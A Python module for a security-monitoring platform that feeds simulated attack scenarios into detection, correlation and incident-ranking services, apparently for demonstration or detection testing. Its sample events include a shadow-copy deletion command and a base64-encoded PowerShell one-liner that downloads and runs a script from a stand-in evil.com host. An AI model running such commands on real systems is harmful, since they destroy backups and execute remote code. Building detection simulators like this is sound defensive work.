import random
import uuid
import time
import asyncio
from typing import Dict, Any
from datetime import datetime, timezone
from sqlalchemy.orm import Session
from app.db.database import SessionLocal
from app.services.normalization import EventNormalizationService
from app.services.enrichment import EnrichmentService
from app.services.detection import DetectionEngine
from app.services.deduplication import DeduplicationService
from app.services.correlation import CorrelationEngine
from app.services.ranking import RankingService
from app.db.models import EventModel, AssetModel, UserModel, IncidentModel

class ScenarioSimulator:
    SIMULATOR_RUNNING = False

    SCENARIOS = {
        "ransomware": {
            "name": "Ransomware Mass Encryption Attack",
            "events": [
                {"source": "EDR", "source_type": "generic_edr", "event_type": "process_creation", "category": "ENDPOINT_EXECUTION", "severity": 4, "host": "FINANCE-PC-01", "user": "finance_user", "process_name": "vssadmin.exe", "command_line": "vssadmin.exe delete shadows /all /quiet", "data_sensitivity": 5, "business_impact": 5},
                {"source": "EDR", "source_type": "generic_edr", "event_type": "mass_file_encrypt", "category": "FILE_SYSTEM", "severity": 5, "host": "FINANCE-PC-01", "user": "finance_user", "process_name": "lockbit.exe", "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "data_sensitivity": 5, "business_impact": 5}
            ]
        },
        "phishing": {
            "name": "Phishing Email & Credential Theft",
            "events": [
                {"source": "EMAIL", "source_type": "email_security", "event_type": "phishing_email", "category": "EMAIL_SECURITY", "severity": 3, "user": "jsmith@corp.local", "url": "http://evil-phish-domain.com/login", "data_sensitivity": 4, "business_impact": 3},
                {"source": "AUTH", "source_type": "authentication", "event_type": "login", "category": "AUTHENTICATION", "severity": 3, "user": "jsmith@corp.local", "source_ip": "185.220.101.5", "authentication_result": "SUCCESS", "data_sensitivity": 4, "business_impact": 3}
            ]
        },
        "brute_force": {
            "name": "Brute Force & Password Spray",
            "events": [
                {"source": "AUTH", "source_type": "authentication", "event_type": "login", "category": "AUTHENTICATION", "severity": 2, "user": "admin", "source_ip": "198.51.100.44", "authentication_result": "FAILURE", "data_sensitivity": 3, "business_impact": 3},
                {"source": "AUTH", "source_type": "authentication", "event_type": "login", "category": "AUTHENTICATION", "severity": 2, "user": "admin", "source_ip": "198.51.100.44", "authentication_result": "FAILURE", "data_sensitivity": 3, "business_impact": 3},
                {"source": "AUTH", "source_type": "authentication", "event_type": "login", "category": "AUTHENTICATION", "severity": 2, "user": "admin", "source_ip": "198.51.100.44", "authentication_result": "FAILURE", "data_sensitivity": 3, "business_impact": 3}
            ]
        },
        "data_exfil": {
            "name": "Sensitive Data Exfiltration to External IP",
            "events": [
                {"source": "FIREWALL", "source_type": "firewall", "event_type": "data_exfiltration", "category": "NETWORK_ACTIVITY", "severity": 5, "host": "DB-SERVER-01", "user": "db_admin", "source_ip": "10.0.1.50", "destination_ip": "93.184.216.34", "data_sensitivity": 5, "business_impact": 5, "attack_confidence": 0.95}
            ]
        },
        "priv_esc": {
            "name": "Privilege Escalation via Obfuscated PowerShell",
            "events": [
                {"source": "EDR", "source_type": "generic_edr", "event_type": "privilege_escalation", "category": "ENDPOINT_EXECUTION", "severity": 4, "host": "DC-SERVER-01", "user": "svc_account", "process_name": "powershell.exe", "command_line": "powershell.exe -Nop -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwAuAHAAcwAxACcAKQA=", "privileged_user": True, "data_sensitivity": 5, "business_impact": 5}
            ]
        },
        "lateral_move": {
            "name": "Lateral Movement Across Tier-1 Assets",
            "events": [
                {"source": "SIEM", "source_type": "generic_siem", "event_type": "lateral_movement", "category": "NETWORK_ACTIVITY", "severity": 4, "host": "WEB-SRV-01", "user": "dev_user", "source_ip": "10.0.2.10", "destination_ip": "10.0.1.1", "data_sensitivity": 4, "business_impact": 4}
            ]
        },
        "port_scan": {
            "name": "Internal Network Reconnaissance / Port Scan",
            "events": [
                {"source": "IDS", "source_type": "ids_ips", "event_type": "port_scan", "category": "NETWORK_ACTIVITY", "severity": 2, "source_ip": "10.0.4.88", "destination_ip": "10.0.4.1", "data_sensitivity": 2, "business_impact": 2}
            ]
        },
        "insider_threat": {
            "name": "Insider Threat Accessing Executive Financial Records",
            "events": [
                {"source": "SIEM", "source_type": "generic_siem", "event_type": "sensitive_file_access", "category": "FILE_SYSTEM", "severity": 3, "host": "HQ-FILES-01", "user": "contractor_john", "data_sensitivity": 5, "business_impact": 4}
            ]
        },
        "cloud_compromise": {
            "name": "Cloud IAM Admin Key Addition Anomaly",
            "events": [
                {"source": "CLOUD", "source_type": "cloud_security", "event_type": "iam_key_create", "category": "CLOUD_ACTIVITY", "severity": 4, "user": "cloud_admin@corp.com", "privileged_user": True, "data_sensitivity": 4, "business_impact": 4}
            ]
        },
        "credential_attack": {
            "name": "Password Spray & Credential Stuffing",
            "events": [
                {"source": "AUTH", "source_type": "authentication", "event_type": "credential_attack", "category": "AUTHENTICATION", "severity": 4, "source_ip": "45.33.32.156", "user": "exec_ceo", "data_sensitivity": 5, "business_impact": 5}
            ]
        }
    }

    @classmethod
    def trigger_scenario(cls, db: Session, scenario_key: str) -> Dict[str, Any]:
        scenario = cls.SCENARIOS.get(scenario_key, cls.SCENARIOS["ransomware"])
        created_event_ids = []
        affected_incidents = []

        # Contextualize to active sector assets and users if available
        active_assets = db.query(AssetModel).order_by(AssetModel.criticality.desc()).all()
        active_users = db.query(UserModel).order_by(UserModel.privileged.desc()).all()

        primary_host = active_assets[0].hostname if active_assets else "FINANCE-PC-01"
        secondary_host = active_assets[1].hostname if len(active_assets) > 1 else primary_host
        primary_crit = active_assets[0].criticality if active_assets else 5

        primary_user = active_users[0].username if active_users else "admin"
        secondary_user = active_users[1].username if len(active_users) > 1 else primary_user

        for raw_e in scenario["events"]:
            event_dict = dict(raw_e)

            # Dynamically replace placeholder hosts with active sector infrastructure
            h = event_dict.get("host")
            if h:
                if h in ["FINANCE-PC-01", "DB-SERVER-01", "DC-SERVER-01"]:
                    event_dict["host"] = primary_host
                    event_dict["hostname"] = primary_host
                elif h in ["WEB-SRV-01", "HQ-FILES-01"]:
                    event_dict["host"] = secondary_host
                    event_dict["hostname"] = secondary_host
                else:
                    event_dict["host"] = primary_host
                    event_dict["hostname"] = primary_host
            elif event_dict.get("category") in ["ENDPOINT_EXECUTION", "FILE_SYSTEM"]:
                event_dict["host"] = primary_host
                event_dict["hostname"] = primary_host

            # Dynamically replace placeholder users with active sector accounts
            u = event_dict.get("user")
            if u:
                if u in ["finance_user", "db_admin", "svc_account", "admin", "exec_ceo"]:
                    event_dict["user"] = primary_user
                else:
                    event_dict["user"] = secondary_user

            # Scale data sensitivity and business impact to match active asset criticality
            if primary_crit >= 4:
                event_dict["data_sensitivity"] = max(event_dict.get("data_sensitivity", 1), primary_crit)
                event_dict["business_impact"] = max(event_dict.get("business_impact", 1), primary_crit)

            # Normalize
            normalized = EventNormalizationService.normalize(event_dict, source_type=event_dict.get("source_type", "generic_siem"))
            # Enrich
            EnrichmentService.enrich_event(db, normalized)

            # DB Store Event
            db_event = EventModel(**normalized.model_dump(exclude_none=True))
            db.add(db_event)
            db.flush()

            # Deduplicate
            DeduplicationService.check_and_deduplicate(db, db_event)
            db.commit()

            created_event_ids.append(db_event.event_id)

            # Detections
            detections = DetectionEngine.evaluate_event(db, db_event)
            # Correlation
            if detections:
                correlated = CorrelationEngine.correlate_detections(db, detections)
                for inc in correlated:
                    if inc not in affected_incidents:
                        affected_incidents.append(inc)

        # Trigger prioritization re-score
        sorted_incidents = RankingService.get_prioritized_incidents(db)
        db.commit()

        # Find target incident to return for UI focus
        target_incident_id = None
        if affected_incidents:
            target_incident_id = affected_incidents[0].incident_id
        elif sorted_incidents:
            target_incident_id = sorted_incidents[0].incident_id

        return {
            "status": "SUCCESS",
            "scenario": scenario["name"],
            "events_ingested": len(created_event_ids),
            "event_ids": created_event_ids,
            "incident_id": target_incident_id
        }
